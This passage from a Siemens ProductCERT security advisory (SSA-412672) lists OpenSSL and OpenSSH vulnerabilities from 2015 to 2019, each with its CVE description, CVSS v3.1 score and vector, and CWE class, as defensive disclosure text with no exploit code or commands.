1.0.2e on the x86_64 platform, as used by the BN_mod_exp function, mishandles carry propagation
and produces incorrect output, which makes it easier for remote attackers to obtain sensitive private-
key information via an attack against use of a (1) Difﬁe-Hellman (DH) or (2) Difﬁe-Hellman Ephemeral
(DHE) ciphersuite.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/E:P/RL:O/RC:C
CWE-200: Exposure of Sensitive Information to an Unauthorized
Actor

Vulnerability CVE-2015-3194

crypto/rsa/rsa_ameth.c in OpenSSL 1.0.1 before 1.0.1q and 1.0.2 before 1.0.2e allows remote
attackers to cause a denial of service (NULL pointer dereference and application crash) via an RSA
PSS ASN.1 signature that lacks a mask generation function parameter.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-476: NULL Pointer Dereference

Vulnerability CVE-2015-3195

The ASN1_TFLG_COMBINE implementation in crypto/asn1/tasn_dec.c in OpenSSL before 0.9.8zh,
1.0.0 before 1.0.0t, 1.0.1 before 1.0.1q, and 1.0.2 before 1.0.2e mishandles errors caused by mal-
formed X509_ATTRIBUTE data, which allows remote attackers to obtain sensitive information from
process memory by triggering a decoding failure in a PKCS#7 or CMS application.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-200: Exposure of Sensitive Information to an Unauthorized
Actor

Vulnerability CVE-2015-3196

ssl/s3_clnt.c in OpenSSL 1.0.0 before 1.0.0t, 1.0.1 before 1.0.1p, and 1.0.2 before 1.0.2d, when
used for a multi-threaded client, writes the PSK identity hint to an incorrect data structure, which
allows remote servers to cause a denial of service (race condition and double free) via a crafted
ServerKeyExchange message.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-362: Concurrent Execution using Shared Resource with Im-
proper Synchronization (’Race Condition’)

Vulnerability CVE-2015-3197

ssl/s2_srvr.c in OpenSSL 1.0.1 before 1.0.1r and 1.0.2 before 1.0.2f does not prevent use of disabled
ciphers, which makes it easier for man-in-the-middle attackers to defeat cryptographic protection
mechanisms by performing computations on SSLv2 trafﬁc, related to the get_client_master_key and
get_client_hello functions.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.9
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N/E:P/RL:O/RC:C
CWE-200: Exposure of Sensitive Information to an Unauthorized
Actor

SSA-412672

© Siemens 2022

Page 7 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2015-4000

The TLS protocol 1.2 and earlier, when a DHE_EXPORT ciphersuite is enabled on a server but not on
a client, does not properly convey a DHE_EXPORT choice, which allows man-in-the-middle attackers
to conduct cipher-downgrade attacks by rewriting a ClientHello with DHE replaced by DHE_EXPORT
and then rewriting a ServerHello with DHE_EXPORT replaced by DHE, aka the “Logjam” issue.

CVSS v3.1 Base Score
CVSS Vector
CWE

3.7
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N/E:P/RL:O/RC:C
CWE-310: Cryptographic Issues

Vulnerability CVE-2015-5352

The x11_open_helper function in channels.c in ssh in OpenSSH before 6.9, when ForwardX11Trusted
mode is not used, lacks a check of the refusal deadline for X connections, which makes it easier for
remote attackers to bypass intended access restrictions via a connection outside of the permitted time
window.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N/E:P/RL:O/RC:C
CWE-264: Permissions, Privileges, and Access Controls

Vulnerability CVE-2015-5600

The kbdint_next_device function in auth2-chall.c in sshd in OpenSSH through 6.9 does not properly
restrict the processing of keyboard-interactive devices within a single connection, which makes it easier
for remote attackers to conduct brute-force attacks or cause a denial of service (CPU consumption) via
a long and duplicative list in the ssh -oKbdInteractiveDevices option, as demonstrated by a modiﬁed
client that provides a different password for each pam element on this list.

CVSS v3.1 Base Score
CVSS Vector
CWE

8.2
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:H/E:P/RL:O/RC:C
CWE-264: Permissions, Privileges, and Access Controls

Vulnerability CVE-2015-6563

The monitor component in sshd in OpenSSH before 7.0 on non-OpenBSD platforms accepts extrane-
ous username data in MONITOR_REQ_PAM_INIT_CTX requests, which allows local users to conduct
impersonation attacks by leveraging any SSH login access in conjunction with control of the sshd uid
to send a crafted MONITOR_REQ_PWNAM request, related to monitor.c and monitor_wrap.c.

CVSS v3.1 Base Score
CVSS Vector
CWE

2.9
CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N/E:P/RL:O/RC:C
CWE-20: Improper Input Validation

Vulnerability CVE-2015-6564

Use-after-free vulnerability in the mm_answer_pam_free_ctx function in monitor.c in sshd in OpenSSH
before 7.0 on non-OpenBSD platforms might allow local users to gain privileges by leveraging control
of the sshd uid to send an unexpectedly early MONITOR_REQ_PAM_FREE_CTX request.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.4
CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C
CWE-264: Permissions, Privileges, and Access Controls

SSA-412672

© Siemens 2022

Page 8 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2015-6565

sshd in OpenSSH 6.8 and 6.9 uses world-writable permissions for TTY devices, which allows local
users to cause a denial of service (terminal disruption) or possibly have unspeciﬁed other impact by
writing to a device, as demonstrated by writing an escape sequence.

CVSS v3.1 Base Score
CVSS Vector
CWE

8.4
CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C
CWE-264: Permissions, Privileges, and Access Controls

Vulnerability CVE-2015-8325

The do_setup_env function in session.c in sshd in OpenSSH through 7.2p2, when the UseLogin
feature is enabled and PAM is conﬁgured to read .pam_environment ﬁles in user home directories,
allows local users to gain privileges by triggering a crafted environment for the /bin/login program, as
demonstrated by an LD_PRELOAD environment variable.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.8
CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C
CWE-264: Permissions, Privileges, and Access Controls

Vulnerability CVE-2016-0701

The DH_check_pub_key function in crypto/dh/dh_check.c in OpenSSL 1.0.2 before 1.0.2f does not
ensure that prime numbers are appropriate for Difﬁe-Hellman (DH) key exchange, which makes it
easier for remote attackers to discover a private DH exponent by making multiple handshakes with a
peer that chose an inappropriate number, as demonstrated by a number in an X9.42 ﬁle.

CVSS v3.1 Base Score
CVSS Vector
CWE

3.7
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N/E:P/RL:O/RC:C
CWE-200: Exposure of Sensitive Information to an Unauthorized
Actor

Vulnerability CVE-2016-0702

The MOD_EXP_CTIME_COPY_FROM_PREBUF function in crypto/bn/bn_exp.c in OpenSSL 1.0.1
before 1.0.1s and 1.0.2 before 1.0.2g does not properly consider cache-bank access times during
modular exponentiation, which makes it easier for local users to discover RSA keys by running a
crafted application on the same Intel Sandy Bridge CPU core as a victim and leveraging cache-bank
conﬂicts, aka a “CacheBleed” attack.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.1
CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N/E:P/RL:O/RC:C
CWE-200: Exposure of Sensitive Information to an Unauthorized
Actor

Vulnerability CVE-2016-0703

The get_client_master_key function in s2_srvr.c in the SSLv2 implementation in OpenSSL before
0.9.8zf, 1.0.0 before 1.0.0r, 1.0.1 before 1.0.1m, and 1.0.2 before 1.0.2a accepts a nonzero CLIENT-
MASTER-KEY CLEAR-KEY-LENGTH value for an arbitrary cipher, which allows man-in-the-middle
attackers to determine the MASTER-KEY value and decrypt TLS ciphertext data by leveraging a
Bleichenbacher RSA padding oracle, a related issue to CVE-2016-0800.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.9
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N/E:P/RL:O/RC:C
CWE-200: Exposure of Sensitive Information to an Unauthorized
Actor

SSA-412672

© Siemens 2022

Page 9 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2016-0704

An oracle protection mechanism in the get_client_master_key function in s2_srvr.c in the SSLv2
implementation in OpenSSL before 0.9.8zf, 1.0.0 before 1.0.0r, 1.0.1 before 1.0.1m, and 1.0.2 before
1.0.2a overwrites incorrect MASTER-KEY bytes during use of export cipher suites, which makes
it easier for remote attackers to decrypt TLS ciphertext data by leveraging a Bleichenbacher RSA
padding oracle, a related issue to CVE-2016-0800.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.9
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N/E:P/RL:O/RC:C
CWE-200: Exposure of Sensitive Information to an Unauthorized
Actor

Vulnerability CVE-2016-0705

Double free vulnerability in the dsa_priv_decode function in crypto/dsa/dsa_ameth.c in OpenSSL 1.0.1
before 1.0.1s and 1.0.2 before 1.0.2g allows remote attackers to cause a denial of service (memory
corruption) or possibly have unspeciﬁed other impact via a malformed DSA private key.

CVSS v3.1 Base Score
CVSS Vector
CWE

9.8
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C
CWE-20: Improper Input Validation

Vulnerability CVE-2016-0777

The resend_bytes function in roaming_common.c in the client in OpenSSH 5.x, 6.x, and 7.x before
7.1p2 allows remote servers to obtain sensitive information from process memory by requesting
transmission of an entire buffer, as demonstrated by reading a private key.

CVSS v3.1 Base Score
CVSS Vector
CWE

6.5
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N/E:P/RL:O/RC:C
CWE-200: Exposure of Sensitive Information to an Unauthorized
Actor

Vulnerability CVE-2016-0778

The (1) roaming_read and (2) roaming_write functions in roaming_common.c in the client in OpenSSH
5.x, 6.x, and 7.x before 7.1p2, when certain proxy and forward options are enabled, do not properly
maintain connection ﬁle descriptors, which allows remote servers to cause a denial of service (heap-
based buffer overﬂow) or possibly have unspeciﬁed other impact by requesting many forwardings.

CVSS v3.1 Base Score
CVSS Vector
CWE

8.1
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C
CWE-119: Improper Restriction of Operations within the Bounds of a
Memory Buffer

Vulnerability CVE-2016-0797

Multiple integer overﬂows in OpenSSL 1.0.1 before 1.0.1s and 1.0.2 before 1.0.2g allow remote
attackers to cause a denial of service (heap memory corruption or NULL pointer dereference) or
possibly have unspeciﬁed other impact via a long digit string that is mishandled by the (1) BN_dec2bn
or (2) BN_hex2bn function, related to crypto/bn/bn.h and crypto/bn/bn_print.c.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-20: Improper Input Validation

SSA-412672

© Siemens 2022

Page 10 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2016-0798

Memory leak in the SRP_VBASE_get_by_user implementation in OpenSSL 1.0.1 before 1.0.1s and
1.0.2 before 1.0.2g allows remote attackers to cause a denial of service (memory consumption) by
providing an invalid username in a connection attempt, related to apps/s_server.c and crypto/sr-
p/srp_vfy.c.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-399: Resource Management Errors

Vulnerability CVE-2016-0799

The fmtstr function in crypto/bio/b_print.c in OpenSSL 1.0.1 before 1.0.1s and 1.0.2 before 1.0.2g
improperly calculates string lengths, which allows remote attackers to cause a denial of service
(overﬂow and out-of-bounds read) or possibly have unspeciﬁed other impact via a long string, as
demonstrated by a large amount of ASN.1 data, a different vulnerability than CVE-2016-2842.

CVSS v3.1 Base Score
CVSS Vector
CWE

9.8
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C
CWE-119: Improper Restriction of Operations within the Bounds of a
Memory Buffer

Vulnerability CVE-2016-0800

A cross-protocol attack was discovered that could allow an attacker to decrypt intercepted TLS
sessions by using a server supporting SSLv2 as a Bleichenbacher RSA padding oracle. In order to
exploit the vulnerability, the attacker must have network access to the affected devices and must be in
a privileged network position.

CVSS v3.1 Base Score
CVSS Vector
CWE

4.0
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:N/A:N/E:P/RL:O/RC:C
CWE-787: Out-of-bounds Write

Vulnerability CVE-2016-1907

The ssh_packet_read_poll2 function in packet.c in OpenSSH before 7.1p2 allows remote attackers to
cause a denial of service (out-of-bounds read and application crash) via crafted network trafﬁc.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-119: Improper Restriction of Operations within the Bounds of a
Memory Buffer

Vulnerability CVE-2016-1908

The client in OpenSSH before 7.2 mishandles failed cookie generation for untrusted X11 forwarding
and relies on the local X11 server for access-control decisions, which allows remote X11 clients to
trigger a fallback and obtain trusted X11 forwarding privileges by leveraging conﬁguration issues on
this X11 server, as demonstrated by lack of the SECURITY extension on this X11 server.

CVSS v3.1 Base Score
CVSS Vector
CWE

9.8
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C
CWE-287: Improper Authentication

SSA-412672

© Siemens 2022

Page 11 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2016-2105

Integer overﬂow in the EVP_EncodeUpdate function in crypto/evp/encode.c in OpenSSL before 1.0.1t
and 1.0.2 before 1.0.2h allows remote attackers to cause a denial of service (heap memory corruption)
via a large amount of binary data.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-190: Integer Overﬂow or Wraparound

Vulnerability CVE-2016-2106

Integer overﬂow in the EVP_EncryptUpdate function in crypto/evp/evp_enc.c in OpenSSL before
1.0.1t and 1.0.2 before 1.0.2h allows remote attackers to cause a denial of service (heap memory
corruption) via a large amount of data.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-190: Integer Overﬂow or Wraparound

Vulnerability CVE-2016-2107

The AES-NI implementation in OpenSSL before 1.0.1t and 1.0.2 before 1.0.2h does not consider
memory allocation during a certain padding check, which allows remote attackers to obtain sensitive
cleartext information via a padding-oracle attack against an AES CBC session. NOTE: this vulnerability
exists because of an incorrect ﬁx for CVE-2013-0169.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.9
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N/E:P/RL:O/RC:C
CWE-200: Exposure of Sensitive Information to an Unauthorized
Actor

Vulnerability CVE-2016-2108

The ASN.1 implementation in OpenSSL before 1.0.1o and 1.0.2 before 1.0.2c allows remote attackers
to execute arbitrary code or cause a denial of service (buffer underﬂow and memory corruption) via an
ANY ﬁeld in crafted serialized data, aka the “negative zero” issue.

CVSS v3.1 Base Score
CVSS Vector
CWE

9.8
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C
CWE-119: Improper Restriction of Operations within the Bounds of a
Memory Buffer

Vulnerability CVE-2016-2109

The asn1_d2i_read_bio function in crypto/asn1/a_d2i_fp.c in the ASN.1 BIO implementation in
OpenSSL before 1.0.1t and 1.0.2 before 1.0.2h allows remote attackers to cause a denial of service
(memory consumption) via a short invalid encoding.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-399: Resource Management Errors

SSA-412672

© Siemens 2022

Page 12 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2016-2176

The X509_NAME_oneline function in crypto/x509/x509_obj.c in OpenSSL before 1.0.1t and 1.0.2
before 1.0.2h allows remote attackers to obtain sensitive information from process stack memory or
cause a denial of service (buffer over-read) via crafted EBCDIC ASN.1 data.

CVSS v3.1 Base Score
CVSS Vector
CWE

8.2
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:H/E:P/RL:O/RC:C
CWE-119: Improper Restriction of Operations within the Bounds of a
Memory Buffer

Vulnerability CVE-2016-2177

OpenSSL through 1.0.2h incorrectly uses pointer arithmetic for heap-buffer boundary checks, which
might allow remote attackers to cause a denial of service (integer overﬂow and application crash) or
possibly have unspeciﬁed other impact by leveraging unexpected malloc behavior, related to s3_srvr.c,
ssl_sess.c, and t1_lib.c.

CVSS v3.1 Base Score
CVSS Vector
CWE

9.8
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C
CWE-190: Integer Overﬂow or Wraparound

Vulnerability CVE-2016-2178

The dsa_sign_setup function in crypto/dsa/dsa_ossl.c in OpenSSL through 1.0.2h does not properly
ensure the use of constant-time operations, which makes it easier for local users to discover a DSA
private key via a timing side-channel attack.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.5
CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N/E:P/RL:O/RC:C
CWE-203: Observable Discrepancy

Vulnerability CVE-2016-2179

The DTLS implementation in OpenSSL before 1.1.0 does not properly restrict the lifetime of queue
entries associated with unused out-of-order messages, which allows remote attackers to cause a
denial of service (memory consumption) by maintaining many crafted DTLS sessions simultaneously,
related to d1_lib.c, statem_dtls.c, statem_lib.c, and statem_srvr.c.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-399: Resource Management Errors

Vulnerability CVE-2016-2180

The TS_OBJ_print_bio function in crypto/ts/ts_lib.c in the X.509 Public Key Infrastructure Time-Stamp
Protocol (TSP) implementation in OpenSSL through 1.0.2h allows remote attackers to cause a denial
of service (out-of-bounds read and application crash) via a crafted time-stamp ﬁle that is mishandled
by the “openssl ts” command.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-125: Out-of-bounds Read

SSA-412672

© Siemens 2022

Page 13 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2016-2181

The Anti-Replay feature in the DTLS implementation in OpenSSL before 1.1.0 mishandles early
use of a new epoch number in conjunction with a large sequence number, which allows remote
attackers to cause a denial of service (false-positive packet drops) via spoofed DTLS records, related
to rec_layer_d1.c and ssl3_record.c.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-682: Incorrect Calculation

Vulnerability CVE-2016-2182

The BN_bn2dec function in crypto/bn/bn_print.c in OpenSSL before 1.1.0 does not properly validate
division results, which allows remote attackers to cause a denial of service (out-of-bounds write and
application crash) or possibly have unspeciﬁed other impact via unknown vectors.

CVSS v3.1 Base Score
CVSS Vector
CWE

9.8
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C
CWE-787: Out-of-bounds Write

Vulnerability CVE-2016-2183

The DES and Triple DES ciphers, as used in the TLS, SSH, and IPSec protocols and other protocols
and products, have a birthday bound of approximately four billion blocks, which makes it easier for
remote attackers to obtain cleartext data via a birthday attack against a long-duration encrypted
session, as demonstrated by an HTTPS session using Triple DES in CBC mode, aka a “Sweet32”
attack.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/E:P/RL:O/RC:C
CWE-200: Exposure of Sensitive Information to an Unauthorized
Actor

Vulnerability CVE-2016-6210

sshd in OpenSSH before 7.3, when SHA256 or SHA512 are used for user password hashing, uses
BLOWFISH hashing on a static password when the username does not exist, which allows remote
attackers to enumerate users by leveraging the timing difference between responses when a large
password is provided.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.9
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N/E:P/RL:O/RC:C
CWE-200: Exposure of Sensitive Information to an Unauthorized
Actor

Vulnerability CVE-2016-6302

The tls_decrypt_ticket function in ssl/t1_lib.c in OpenSSL before 1.1.0 does not consider the HMAC
size during validation of the ticket length, which allows remote attackers to cause a denial of service
via a ticket that is too short.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-20: Improper Input Validation

SSA-412672

© Siemens 2022

Page 14 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2016-6303

Integer overﬂow in the MDC2_Update function in crypto/mdc2/mdc2dgst.c in OpenSSL before 1.1.0
allows remote attackers to cause a denial of service (out-of-bounds write and application crash) or
possibly have unspeciﬁed other impact via unknown vectors.

CVSS v3.1 Base Score
CVSS Vector
CWE

9.8
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C
CWE-787: Out-of-bounds Write

Vulnerability CVE-2016-6304

Multiple memory leaks in t1_lib.c in OpenSSL before 1.0.1u, 1.0.2 before 1.0.2i, and 1.1.0 before
1.1.0a allow remote attackers to cause a denial of service (memory consumption) via large OCSP
Status Request extensions.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-401: Missing Release of Memory after Effective Lifetime

Vulnerability CVE-2016-6305

The ssl3_read_bytes function in record/rec_layer_s3.c in OpenSSL 1.1.0 before 1.1.0a allows remote
attackers to cause a denial of service (inﬁnite loop) by triggering a zero-length record in an SSL_peek
call.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-20: Improper Input Validation

Vulnerability CVE-2016-6306

The certiﬁcate parser in OpenSSL before 1.0.1u and 1.0.2 before 1.0.2i might allow remote attackers
to cause a denial of service (out-of-bounds read) via crafted certiﬁcate operations, related to s3_clnt.c
and s3_srvr.c.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.9
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-125: Out-of-bounds Read

Vulnerability CVE-2016-6307

The state-machine implementation in OpenSSL 1.1.0 before 1.1.0a allocates memory before checking
for an excessive length, which might allow remote attackers to cause a denial of service (memory
consumption) via crafted TLS messages, related to statem/statem.c and statem/statem_lib.c.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.9
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-400: Uncontrolled Resource Consumption

Vulnerability CVE-2016-6308

statem/statem_dtls.c in the DTLS implementation in OpenSSL 1.1.0 before 1.1.0a allocates memory
before checking for an excessive length, which might allow remote attackers to cause a denial of
service (memory consumption) via crafted DTLS messages.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.9
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-399: Resource Management Errors

SSA-412672

© Siemens 2022

Page 15 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2016-6515

The auth_password function in auth-passwd.c in sshd in OpenSSH before 7.3 does not limit password
lengths for password authentication, which allows remote attackers to cause a denial of service (crypt
CPU consumption) via a long string.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-20: Improper Input Validation

Vulnerability CVE-2016-8858

DISPUTED The kex_input_kexinit function in kex.c in OpenSSH 6.x and 7.x through 7.3 allows remote
attackers to cause a denial of service (memory consumption) by sending many duplicate KEXINIT
requests. NOTE: a third party reports that “OpenSSH upstream does not consider this as a security
issue.”

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-399: Resource Management Errors

Vulnerability CVE-2016-10009

Untrusted search path vulnerability in ssh-agent.c in ssh-agent in OpenSSH before 7.4 allows remote
attackers to execute arbitrary local PKCS#11 modules by leveraging control over a forwarded agent-
socket.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:U/RL:O/RC:C
CWE-426: Untrusted Search Path

Vulnerability CVE-2016-10010

sshd in OpenSSH before 7.4, when privilege separation is not used, creates forwarded Unix-domain
sockets as root, which might allow local users to gain privileges via unspeciﬁed vectors, related to
serverloop.c.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.0
CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C
CWE-264: Permissions, Privileges, and Access Controls

Vulnerability CVE-2016-10011

authﬁle.c in sshd in OpenSSH before 7.4 does not properly consider the effects of realloc on buffer
contents, which might allow local users to obtain sensitive private-key information by leveraging access
to a privilege-separated child process.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.5
CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N/E:U/RL:O/RC:C
CWE-264: Permissions, Privileges, and Access Controls

SSA-412672

© Siemens 2022

Page 16 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2016-10012

The shared memory manager (associated with pre-authentication compression) in sshd in OpenSSH
before 7.4 does not ensure that a bounds check is enforced by all compilers, which might allows local
users to gain privileges by leveraging access to a sandboxed privilege-separation process, related to
the m_zback and m_zlib data structures.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.8
CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C
CWE-119: Improper Restriction of Operations within the Bounds of a
Memory Buffer

Vulnerability CVE-2017-3735

While parsing an IPAddressFamily extension in an X.509 certiﬁcate, it is possible to do a one-byte
overread. This would result in an incorrect text display of the certiﬁcate. This bug has been present
since 2006 and is present in all versions of OpenSSL before 1.0.2m and 1.1.0g.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N/E:P/RL:O/RC:C
CWE-119: Improper Restriction of Operations within the Bounds of a
Memory Buffer

Vulnerability CVE-2017-15906

The process_open function in sftp-server.c in OpenSSH before 7.6 does not properly prevent write
operations in readonly mode, which allows attackers to create zero-length ﬁles.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N/E:U/RL:O/RC:C
CWE-732: Incorrect Permission Assignment for Critical Resource

Vulnerability CVE-2018-15473

OpenSSH through 7.7 is prone to a user enumeration vulnerability due to not delaying bailout for an
invalid authenticating user until after the packet containing the request has been fully parsed, related
to auth2-gss.c, auth2-hostbased.c, and auth2-pubkey.c.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N/E:U/RL:O/RC:C
CWE-362: Concurrent Execution using Shared Resource with Im-
proper Synchronization (’Race Condition’)

Vulnerability CVE-2018-20685

In OpenSSH 7.9, scp.c in the scp client allows remote SSH servers to bypass intended access
restrictions via the ﬁlename of . or an empty ﬁlename. The impact is modifying the permissions of the
target directory on the client side.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N/E:P/RL:O/RC:C
CWE-863: Incorrect Authorization

SSA-412672

© Siemens 2022

Page 17 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2019-1552

OpenSSL has internal defaults for a directory tree where it can ﬁnd a conﬁguration ﬁle as well as
certiﬁcates used for veriﬁcation in TLS. This directory is most commonly referred to as OPENSSLDIR,
and is conﬁgurable with the –preﬁx / –openssldir conﬁguration options. For OpenSSL versions 1.1.0
and 1.1.1, the mingw conﬁguration targets assume that resulting programs and libraries are installed
in a Unix-like environment and the default preﬁx for program installation as well as for OPENSSLDIR
should be ‘/usr/local’. However, mingw programs are Windows programs, and as such, ﬁnd themselves
looking at sub-directories of ‘C:/usr/local’, which may be world writable, which enables untrusted users
to modify OpenSSL’s default conﬁguration, insert CA certiﬁcates, modify (or even replace) existing
engine modules, etc. For OpenSSL 1.0.2, ‘/usr/local/ssl’ is used as default for OPENSSLDIR on
